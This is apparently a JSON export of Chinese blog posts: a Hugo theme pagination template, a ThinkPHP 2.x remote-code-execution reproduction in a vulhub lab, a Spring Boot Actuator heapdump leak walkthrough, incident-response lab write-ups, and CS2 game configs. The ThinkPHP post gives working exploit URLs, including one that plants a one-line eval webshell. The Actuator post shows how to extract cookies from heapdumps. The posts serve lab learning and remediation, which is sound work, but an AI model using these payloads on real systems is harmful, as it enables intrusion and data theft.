[{"content":"演示效果： 修改： 在\\layouts\\_default文件夹下创建：archives.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 {{ define \u0026#34;body-class\u0026#34; }}template-archives{{ end }} {{ define \u0026#34;main\u0026#34; }} \u0026lt;header\u0026gt; {{- $taxonomy := $.Site.GetPage \u0026#34;taxonomyTerm\u0026#34; \u0026#34;categories\u0026#34; -}} {{- $terms := $taxonomy.Pages -}} {{ if $terms }} \u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;{{ $taxonomy.Title }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;subsection-list\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;article-list--tile\u0026#34;\u0026gt; {{ range $terms }} {{ partial \u0026#34;article-list/tile\u0026#34; (dict \u0026#34;context\u0026#34; . \u0026#34;size\u0026#34; \u0026#34;250x150\u0026#34; \u0026#34;Type\u0026#34; \u0026#34;taxonomy\u0026#34;) }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/header\u0026gt; {{ $pages := where .Site.RegularPages \u0026#34;Type\u0026#34; \u0026#34;in\u0026#34; .Site.Params.mainSections }} {{ $notHidden := where .Site.RegularPages \u0026#34;Params.hidden\u0026#34; \u0026#34;!=\u0026#34; true }} {{ $filtered := ($pages | intersect $notHidden) }} {{ range $filtered.GroupByDate \u0026#34;2006\u0026#34; }} {{ $id := lower (replace .Key \u0026#34; \u0026#34; \u0026#34;-\u0026#34;) }} \u0026lt;div class=\u0026#34;archives-group\u0026#34; id=\u0026#34;{{ $id }}\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;archives-date section-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ $.RelPermalink }}#{{ $id }}\u0026#34;\u0026gt;{{ .Key }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;article-list--compact\u0026#34; data-year=\u0026#34;{{ .Key }}\u0026#34; data-total=\u0026#34;{{ len .Pages }}\u0026#34;\u0026gt; {{ range $index, $page := .Pages }} \u0026lt;div class=\u0026#34;article-item\u0026#34; data-index=\u0026#34;{{ $index }}\u0026#34; {{ if ge $index 8 }}style=\u0026#34;display: none;\u0026#34;{{ end }}\u0026gt; {{ partial \u0026#34;article-list/compact\u0026#34; $page }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{/* 如果文章数量超过8篇，显示分页控件 */}} {{ if gt (len .Pages) 8 }} \u0026lt;div class=\u0026#34;archives-pagination\u0026#34; data-year=\u0026#34;{{ .Key }}\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;pagination-btn prev-btn\u0026#34; onclick=\u0026#34;showPrevPage(\u0026#39;{{ .Key }}\u0026#39;)\u0026#34; disabled\u0026gt;上一页\u0026lt;/button\u0026gt; \u0026lt;span class=\u0026#34;pagination-info\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;current-page\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; / \u0026lt;span class=\u0026#34;total-pages\u0026#34;\u0026gt;{{ math.Ceil (div (len .Pages) 8.0) }}\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;pagination-btn next-btn\u0026#34; onclick=\u0026#34;showNextPage(\u0026#39;{{ .Key }}\u0026#39;)\u0026#34;\u0026gt;下一页\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;style\u0026gt; .archives-pagination { display: flex; justify-content: center; align-items: center; gap: 15px; margin: 20px 0; padding: 15px; background: var(--card-background); border-radius: 8px; } .pagination-btn { padding: 8px 16px; border: 1px solid var(--border-color); background: var(--card-background); color: var(--primary-color); border-radius: 4px; cursor: pointer; transition: all 0.2s ease; } .pagination-btn:hover:not(:disabled) { background: #ff69b4; color: white; } .pagination-btn:disabled { opacity: 0.5; cursor: not-allowed; } .pagination-info { font-size: 14px; color: var(--secondary-text-color); } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; const paginationState = {}; function initPagination(year) { const container = document.querySelector(`[data-year=\u0026#34;${year}\u0026#34;]`); const totalItems = parseInt(container.dataset.total); const itemsPerPage = 8; const totalPages = Math.ceil(totalItems / itemsPerPage); paginationState[year] = { currentPage: 1, totalPages: totalPages, itemsPerPage: itemsPerPage }; } function showPage(year, page) { const container = document.querySelector(`[data-year=\u0026#34;${year}\u0026#34;]`); const items = container.querySelectorAll(\u0026#39;.article-item\u0026#39;); const startIndex = (page - 1) * 8; const endIndex = startIndex + 8; items.forEach((item, index) =\u0026gt; { if (index \u0026gt;= startIndex \u0026amp;\u0026amp; index \u0026lt; endIndex) { item.style.display = \u0026#39;block\u0026#39;; } else { item.style.display = \u0026#39;none\u0026#39;; } }); // 更新分页控件 const pagination = document.querySelector(`.archives-pagination[data-year=\u0026#34;${year}\u0026#34;]`); if (pagination) { const currentPageSpan = pagination.querySelector(\u0026#39;.current-page\u0026#39;); const prevBtn = pagination.querySelector(\u0026#39;.prev-btn\u0026#39;); const nextBtn = pagination.querySelector(\u0026#39;.next-btn\u0026#39;); currentPageSpan.textContent = page; prevBtn.disabled = page === 1; nextBtn.disabled = page === paginationState[year].totalPages; } paginationState[year].currentPage = page; } function showNextPage(year) { if (paginationState[year] \u0026amp;\u0026amp; paginationState[year].currentPage \u0026lt; paginationState[year].totalPages) { showPage(year, paginationState[year].currentPage + 1); } } function showPrevPage(year) { if (paginationState[year] \u0026amp;\u0026amp; paginationState[year].currentPage \u0026gt; 1) { showPage(year, paginationState[year].currentPage - 1); } } // 初始化所有年份的分页 document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function() { const archivesGroups = document.querySelectorAll(\u0026#39;.archives-group\u0026#39;); archivesGroups.forEach(group =\u0026gt; { const year = group.querySelector(\u0026#39;.article-list--compact\u0026#39;).dataset.year; if (year) { initPagination(year); } }); }); \u0026lt;/script\u0026gt; {{ partialCached \u0026#34;footer/footer\u0026#34; . }} {{ end }} 即可！！！\n","date":"2025-09-02T00:00:00Z","image":"http://localhost:1313/images/28.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%BD%92%E6%A1%A3%E4%B8%8B%E4%B8%80%E9%A1%B5%E9%85%8D%E7%BD%AE/","title":"【Hugo】hugo-stack主题魔改-归档下一页配置"},{"content":"0x00 实验环境 攻击机：Win 11\n靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）\nvulhub靶场下载地址：\n1 https://vulhub.org/zh#/environments/thinkphp/2-rce/ 部署：\n1 2 3 cd vulhub-master/thinkphp/2-rce docker-compose up -d docker ps 0x01 影响版本 标志：/index.php\n版本：thinkphp2.x\n简介：在ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：\n1 $res = preg_replace(\u0026#39;@(\\w+)\u0026#39;.$depr.\u0026#39;([^\u0026#39;.$depr.\u0026#39;\\/]+)@e\u0026#39;, \u0026#39;$var[\\\u0026#39;\\\\1\\\u0026#39;]=\u0026#34;\\\\2\u0026#34;;\u0026#39;, implode($depr,$paths)); 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞\n大体说的还是因为php版本在5.6.29以下时都是支持该函数执行中间的命令的，可到了7.x就不支持了。简单来讲就是\n1 preg_replace(\u0026#39;正则规则\u0026#39;,\u0026#39;替换字符\u0026#39;,\u0026#39;目标字符\u0026#39;) e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;\n/e 可执行模式，此为PHP专有参数，例如preg_replace函数。\n例如：\n1 2 \u0026lt;?php @preg_replace(\u0026#39;/test/e\u0026#39;,\u0026#39;print_r(\u0026#34;AAA\u0026#34;);\u0026#39;,\u0026#39;just test\u0026#39;); 只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。\n0x02 漏洞复现 注：复现是比较简单的，原理需要自己去深入剖析\n（1）访问页面\n（2）使用报错爆出thinkphp的版本2.1：\n1 http://192.168.197.140:8080/index.php/111 （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件\u0026lt;=php5.6.29，下面这个版本是满足条件的：\n（4）漏洞利用：\n1 http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()} （5）传马，使用以下语句（类似于在该页面写入了一句话木马）：\n1 http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))} 菜刀与蚁剑均能连接：\n蚁剑连接：\n0x02 漏洞修复 升级框架版本\nThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。最彻底的方式是升级到官方支持的最新版本（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。\n","date":"2025-09-02T00:00:00Z","image":"http://localhost:1313/images/29.webp","permalink":"http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行"},{"content":"0x00 什么是Actuator Spring Boot Actuator 模块提供了健康检查，审计，指标收集，HTTP 跟踪等，是帮助我们监控和管理Spring Boot 应用的模块。这个模块采集应用的内部信息，展现给外部模块，可以查看应用配置的详细信息，例如自动化配置信息、创建的Spring beans信息、系统环境变量的配置信息以及Web请求的详细信息等。\n如果没有正确使用Actuator，可能造成信息泄露等严重的安全隐患（外部人员非授权访问Actuator端点）。其中heapdump作为Actuator组件最为危险的Web端点，heapdump因未授权访问被恶意人员获取后进行分析，可进一步获取敏感信息。\nSpringBoot 1.x 和 2.x 的 Actuator模块设置有差别，访问功能的路径也有差别，但现在多使用的SpringBoot版本为2.x，这篇文章只讲SpringBoo 2.x Actuator模块带来的信息泄露。\n0x01 Actuator 使用 如果要使用 SpringBoot Actuator 提供的监控功能，需要先加入相关的 maven dependency：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 只要加上了这个actuator依赖，SpringBoot 在运行时会自动开启/actuator/health和/actuator/info这两个 endpoint。\n为了更方便漏洞利用，当前环境在一个CMS中加入了该依赖，因为自己新建的Springboot项目没有配置数据库之类的信息。\n0x02 Endpoints 介绍 Spring Boot 提供了所谓的 endpoints （下文翻译为端点）给外部来与应用程序进行访问和交互。\n打比方来说，/health 端点 提供了关于应用健康情况的一些基础信息。metrics 端点提供了一些有用的应用程序指标（JVM 内存使用、系统CPU使用等）。\n这些 Actuator 模块本来就有的端点我们称之为原生端点。根据端点的作用的话，我们大概可以分为三大类：\n应用配置类：获取应用程序中加载的应用配置、环境变量、自动化配置报告等与Spring Boot应用密切相关的配置类信息。 度量指标类：获取应用程序运行过程中用于监控的度量指标，比如：内存信息、线程池信息、HTTP请求统计等。 操作控制类：提供了对应用的关闭等操作类功能。 需要注意的就是：\n每一个端点都可以通过配置来单独禁用或者启动\n不同于Actuator 1.x，Actuator 2.x 的大多数端点默认被禁掉。Actuator 2.x 中的默认端点增加了/actuator前缀。默认暴露的两个端点为/actuator/health和 /actuator/info\n原生端点如下：\n请求方法 端点 描述 GET /actuator 查看有哪些 Actuator端点是开放的。 GET /actuator/auditevent auditevents端点提供有关应用程序审计事件的信息。 GET /actuator/beans beans端点提供有关应用程序 bean 的信息。 GET /actuator/conditions conditions端点提供有关配置和自动配置类条件评估的信息。 GET /actuator/configprops configprops端点提供有关应用程序@ConfigurationPropertiesbean的信息。 GET /actuator/env 查看全部环境属性，可以看到 SpringBoot 载入哪些 properties，以及 properties 的值（会自动用*替换 key、password、secret 等关键字的 properties 的值）。 GET /actuator/flyway flyway端点提供有关 Flyway 执行的数据库迁移的信息。 GET /actuator/health 端点提供有关应用程序运行状况的health详细信息。 GET /actuator/heapdump heapdump端点提供来自应用程序 JVM 的堆转储。(通过分析查看/env端点被*号替换到数据的具体值。) GET /actuator/httptrace httptrace端点提供有关 HTTP 请求-响应交换的信息。（包括用户HTTP请求的Cookie数据，会造成Cookie泄露等） GET /actuator/info info端点提供有关应用程序的一般信息。 GET /actuator/integrationgraph integrationgraph端点公开了一个包含所有 Spring Integration 组件的图。 GET /actuator/liquibase liquibase端点提供有关 Liquibase 应用的数据库更改集的信息。 GET /actuator/logfile logfile端点提供对应用程序日志文件内容的访问。 GET /actuator/loggers loggers端点提供对应用程序记录器及其级别配置的访问。 GET /actuator/mappings mappings端点提供有关应用程序请求映射的信息。 GET /actuator/metrics metrics端点提供对应用程序指标的访问。 GET /actuator/prometheus 端点以prometheusPrometheus 服务器抓取所需的格式提供 Spring Boot 应用程序的指标。 GET /actuator/quartz quartz端点提供有关由 Quartz 调度程序管理的作业和触发器的信息。 GET /actuator/scheduledtasks scheduledtasks端点提供有关应用程序计划任务的信息。 GET /actuator/sessions sessions端点提供有关由 Spring Session 管理的应用程序 HTTP 会话的信息。 GET /actuator/startup startup端点提供有关应用程序启动顺序的信息。 POST /actuator/shutdown shutdown端点用于关闭应用程序。 0x03 漏洞利用 前面介绍过了Actuator一些基础后，现在来研究一下如果目标站点存在这个漏洞该如何利用。\n首先访问一下/actuator/env该文件目录，寻找一下敏感信息等等\n/actuator/heapdump文件可以直接下载下来。使用工具进行分析：\n工具下载地址：\n1 2 3 通过网盘分享的文件：JDumpSpider-1.1-SNAPSHOT-full.jar 链接: https://pan.baidu.com/s/1tL0gY9Xm4jBrXUxVj-g8og 提取码: pkb9 --来自百度网盘超级会员v4的分享 使用：\n1 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar 绝地地址（heapdump） \u0026gt;\u0026gt;222.txt 这里直接泄露了Cookie信息。\n0x04 漏洞修复 1、屏蔽actuator路径\n1 2 3 location ~ .*actuator.* { deny all; } ","date":"2025-09-02T00:00:00Z","image":"http://localhost:1313/images/27.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95spring-boot-actuator-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E9%AB%98%E5%8D%B1/","title":"【渗透测试】Spring Boot Actuator 敏感信息泄露-高危"},{"content":"简介 服务器场景操作系统 Windows\n服务器账号密码 administrator xj@123456\n题目来源公众号 知攻善防实验室\nhttps://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查\n开放题目\n漏洞修复\n参考\nhttps://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg\n靶机启动 过程 flag1 通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;\n上传D盾,直接扫就行.\n打开文件,发现默认密码\nflag\n1 flag{rebeyond} flag2 通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;\n查看apache.log文件,发现写入了webshell.php文件.\n1 log日志地址:C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs flag:\n1 flag{192.168.126.1} flag3 通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;\n直接使用工具,即可\nflag:\n1 flag{hacker138} flag4 通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;\n找到hacker128用户的桌面,发现一个恶意的挖矿程序,然后进行反编译一下,得到flag\nflag\n1 flag{wakuang.zhigongshanfang.top} ","date":"2025-09-01T00:00:00Z","image":"http://localhost:1313/images/25.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/","title":"【玄机靶场】第四章 windows 实战-emlog"},{"content":"简介 第四章 windows实战-wordpress\nrdp 端口 3389\n账号：administrator\n密码：xj@123456\nflag1 请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}\n登录后台，获取后台地址：http://localhost:8080/manage/login.php\n在日志里筛选一下：\n1 grep \u0026#34;manage/login.php\u0026#34; access.log 可以看到302成功跳转：\n1 2 3 4 5 6 7 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1\u0026#34; 302 5 \u0026#34;http:// 192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) G ecko/20100101 Firefox/110.0\u0026#34; 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;GET /manage/ HTTP/1.1\u0026#34; 302 5 \u0026#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F %2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\u0026#34; 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;GET /manage/welcome.php HTTP/1.1\u0026#34; 200 10013 \u0026#34;http://192.168.141.188/manage/login.php?ref erer=http%3A%2F%2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\u0026#34; flag\n1 flag{2023:04:29 22:45:23} flag2 请提交攻击者的浏览器版本 flag{Firgfox/2200}\n由flag1可知\nflag\n1 flag{Firefox/110.0} flag3 请提交攻击者目录扫描所使用的工具名称\n可以看出扫描器的特征：\n1 Fuzz Faster U Fool v1.5.0 flag\n1 flag{Fuzz Faster U Fool} flag4 找到攻击者写入的恶意后门文件，提交文件名（完整路径）\n查看日志：\n1 flag{C:\\phpstudy_pro\\WWW\\.x.php} flag5 找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）\nD盾直接扫描即可：\n1 flag{C:\\phpstudy_pro\\WWW\\usr\\themes\\default\\post.php} flag6 请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}\n查看开机自动文件夹，并没有发现有什么恶意的东西。\n1 2 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 并无可疑文件，接下来查看 Temp 目录和 Windows 目录\n在 Windows 目录下，发现可疑文件\n在windows目录下，发现一个x.bat文件，发现这个bat文件是打开360.exe文件\nflag\n1 flag{x.bat} ","date":"2025-09-01T00:00:00Z","image":"http://localhost:1313/images/26.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/","title":"【玄机靶场】第四章 windows 实战-wordpress"},{"content":"1. 前言 服务框架是指某领域一类服务的可复用设计与不完整的实现， 与软件框架不同的是， 服务框架同时体现着面向服务， 一个服务框架可以分为两个主要部分： 服务引擎、 引入的外部服务。 ThinkPHP， 是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。 可想而知框架连接着网络和系统接触着越来越多的关键数据， 渐渐成为单位公共安全中最具有战略性的资产， 框架的安全稳定运行也直接决定着业务系统能否正常使用。 如果框架被远程代码执行攻破， 这些信息一旦被篡改或者泄露， 轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。\nThinkPHP是一个快速、 兼容而且简单的轻量级国产PHP开发框架， 诞生于2006年初， 原名FCS， 2007年元旦正式更名为ThinkPHP， 遵循Apache2开源协议发布， 从Struts结构移植过来并做了改进和完善， 同时也借鉴了国外很多优秀的框架和模式， 使用面向对象的开发结构和MVC模式， 融合了Struts的思想和TagLib（ 标签库） 、 RoR的ORM映射和ActiveRecord模式。 ThinkPHP可在Windows和Linux等操作系统运行， 支持MySql， Sqlite\n和PostgreSQL等多种数据库以及PDO扩展， 是一款跨平台， 跨版本以及简单易用的PHP框架。\n2. 识别tp框架（指纹） 2.1 icon判断 /favicon.ico\n2.1 报错 2.3 错误传参 2.4 特殊指纹出现logo /?c=4e5e5d7364f443e28fbf0d3ae744a59a\n/4e5e5d7364f443e28fbf0d3ae744a59a\n/4e5e5d7364f443e28fbf0d3ae744a59a-index.html\n2.5 body特征 body里有\u0026quot;十年磨一剑\u0026quot; 或者\u0026quot;ThinkPHP\u0026quot;\n2.6 插件 ","date":"2025-08-31T00:00:00Z","image":"http://localhost:1313/images/22.webp","permalink":"http://localhost:1313/p/thinkphp%E8%AF%86%E5%88%ABtp%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9-01/","title":"【Thinkphp】识别tp框架(指纹)-01"},{"content":"简介 题目来源公众号 vulntarget\nhttps://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg\n任务环境说明\nwindows账密：workstation admin@20221123\nweb端口外部无法访问，请RDP连接上机排查\nflag1 主站进入后台的文件名称？\n查看apache日志，找到\nflag\n1 flag{FNeSOgYGkp.php} flag2 黑客是从哪个端口上传木马文件的?\n打开小皮查看网页端口，7001打不开，所以为80\nflag\n1 flag{80} flag3 黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)\n直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。\n1 flag{api3.php:Admin} flag4 可以根据日志查看：\n1 flag{192.168.112.123} ","date":"2025-08-31T00:00:00Z","image":"http://localhost:1313/images/24.webp","permalink":"http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01/","title":"【玄机靶场】应急响应-vulntarget-j-01"},{"content":"autoexec.cfg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 alias +pwaswitchknife slot3 alias -pwaswitchknife lastinv alias \u0026#34;refundall\u0026#34; \u0026#34;sellback 0;sellback 1;sellback 2;sellback 3;sellback 4;sellback 5;sellback 6;sellback 8;sellback 9;sellback 10;sellback 11;sellback 12;sellback 13;sellback 14;sellback 15;sellback 16;sellback 17;sellback 18;sellback 26;sellback 26;sellback 27;sellback 28;sellback 29;sellback 30;sellback 32;sellback 33;sellback 34;sellback 35;play ui\\panorama\\itemtile_click_02.vsnd_c\u0026#34; //-----------------------------HUD设置-------------------------------- //游戏HUD(0关闭,1开启) cl_drawhud \u0026#34;1\u0026#34;; //只显示击杀和准星(0关闭,1开启) cl_draw_only_deathnotices \u0026#34;0\u0026#34;; //HUD颜色(0队伍颜色,1白色,2亮白色,3淡蓝色,4蓝色,5紫色,6红色,7橙色,8黄色,9绿色,10浅绿色,11粉红色) cl_hud_color \u0026#34;11\u0026#34;; //一直显示装备栏(0关闭,1开启) cl_showloadout \u0026#34;1\u0026#34;; //游戏自动提示(0关闭,1开启) cl_autohelp \u0026#34;0\u0026#34;; //鼠标灵敏度 sensitivity 1.2 zoom_sensitivity_ratio_mouse 1.2 //-----------------------------准星设置-------------------------------- cl_crosshairalpha \u0026#34;200\u0026#34;; cl_crosshaircolor \u0026#34;1\u0026#34;;//颜色 cl_crosshairdot \u0026#34;0\u0026#34;; cl_crosshair_t \u0026#34;0\u0026#34;; cl_crosshairgap \u0026#34;-5\u0026#34;;//间距 cl_crosshairsize \u0026#34;1.29\u0026#34;;//长度 cl_crosshairstyle \u0026#34;4\u0026#34;; cl_crosshairthickness \u0026#34;-10.0\u0026#34;;//粗细 cl_crosshair_outlinethickness \u0026#34;0\u0026#34;; cl_crosshair_drawoutline \u0026#34;0\u0026#34;; //狙击准星粗细 cl_crosshair_sniper_width \u0026#34;0\u0026#34;; //狙击准星模糊(0关闭，1开启) cl_crosshair_sniper_show_normal_inaccuracy \u0026#34;0\u0026#34;; //准星警告(0关闭，1开启) cl_crosshair_friendly_warning \u0026#34;0\u0026#34;; //手臂视角类型(0自定义，1默认，2写实，3经典) viewmodel_presetpos \u0026#34;3\u0026#34;; //手臂左右位置(-2.25~2.25) viewmodel_offset_x \u0026#34;2.5\u0026#34;; //手臂前后位置(-2~2) viewmodel_offset_y \u0026#34;0\u0026#34;; //手臂上下位置(-2~2) viewmodel_offset_z \u0026#34;-1.5\u0026#34;; //手臂FOV(54~68) viewmodel_fov \u0026#34;68\u0026#34;; //新手臂摇晃动作(false关闭，true开启) cl_usenewbob false //-----------------------------鼠标按键设置-------------------------------- //鼠标左键 开火 bind \u0026#34;mouse1\u0026#34; \u0026#34;+attack\u0026#34;; //鼠标右键 第二开火 bind \u0026#34;mouse2\u0026#34; \u0026#34;+attack2\u0026#34;; //鼠标里侧键 使用麦克风 bind \u0026#34;mouse5\u0026#34; \u0026#34;+voicerecord\u0026#34;; //鼠标外侧键 切换左右持枪 bind \u0026#34;mouse4\u0026#34; \u0026#34;switchhands\u0026#34;; //鼠标下滚轮 跳跃 bind \u0026#34;mwheeldown\u0026#34; \u0026#34;+jump\u0026#34;; //-----------------------------雷达设置-------------------------------- //游戏雷达(0关闭,1开启) cl_drawhud_force_radar \u0026#34;1\u0026#34;; //雷达大小(0.8~1.3) cl_hud_radar_scale \u0026#34;1.3\u0026#34;; //雷达缩放(0.25~0.7) cl_radar_scale \u0026#34;0.35\u0026#34;; //雷达以玩家为中心(0关闭,1开启) cl_radar_always_centered \u0026#34;0\u0026#34;; //雷达旋转(0关闭,1开启) cl_radar_rotate \u0026#34;1\u0026#34;; //雷达人物大小(0.4~1) cl_radar_icon_scale_min \u0026#34;0.4\u0026#34;; //计分板雷达显示模式(0圆形,1方形) cl_radar_square_with_scoreboard \u0026#34;1\u0026#34;; //-----------------------------游戏帧数上限(0无上限)-------------------------------- fps_max \u0026#34;0\u0026#34;; //-----------------------------按键绑定-------------------------------- bind \u0026#34;downarrow\u0026#34; \u0026#34;buy rifle1;\u0026#34; bind \u0026#34;rightarrow\u0026#34; \u0026#34;buy rifle4;\u0026#34; bind \u0026#34;leftarrow\u0026#34; \u0026#34;buy vesthelm;buy vest;\u0026#34; bind \u0026#34;kp_3\u0026#34; \u0026#34;buy secondary4;\u0026#34; bind \u0026#34;kp_4\u0026#34; \u0026#34;buy smokegrenade;\u0026#34; bind \u0026#34;kp_5\u0026#34; \u0026#34;buy flashbang;\u0026#34; bind \u0026#34;kp_6\u0026#34; \u0026#34;buy molotov;buy incgrenade;\u0026#34; //-----------------------------滚轮跳设置-------------------------------- //下滚轮跳 bind \u0026#34;MWHEELDOWN\u0026#34; \u0026#34;+jump\u0026#34; bind \u0026#34;v\u0026#34; \u0026#34;+jump\u0026#34; bind \u0026#34;space\u0026#34; \u0026#34;+jump\u0026#34; lianxi.cfg 一些跑图的cfg文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 //开启作弊 sv_cheats true //去除开场动画 cl_versus_intro false mp_team_intro_time 0 //钱 无限时间 购买时间地点 mp_buy_anywhere 1 mp_buytime 99999 ammo_grenade_limit_total 5 mp_maxmoney 16000 mp_startmoney 16000 mp_roundtime 60 mp_roundtime_defuse 60 mp_roundtime_hostage 60 mp_freezetime 0 bot_stop 1 //无坠落道具伤害 能看到火烧效果 sv_falldamage_scale 0 sv_hegrenade_damage_multiplier 0 sv_regeneration_force_on true ff_damage_reduction_grenade_self 0 //飞行 bind alt noclip //加bot和踢bot bind = bot_add bind - bot_kick //放置bot bind o bot_place //重复上一个道具 bind i sv_rethrow_last_grenade //刷新游戏 bind l mp_restartgame 1 //切换子弹落点显示 bind p \u0026#34;toggle sv_showimpacts 0 1\u0026#34; //清除烟雾弹 bind k \u0026#34;ent_fire smokegrenade_projectile kill;ent_fire molotov_projectile kill;ent_fire flashbang_projectile kill;ent_fire hegrenade_projectile kill;ent_fire decoy_projectile kill;stopsound\u0026#34; //自动复活 mp_respawn_on_death_ct true mp_respawn_on_death_t true mp_restartgame 1 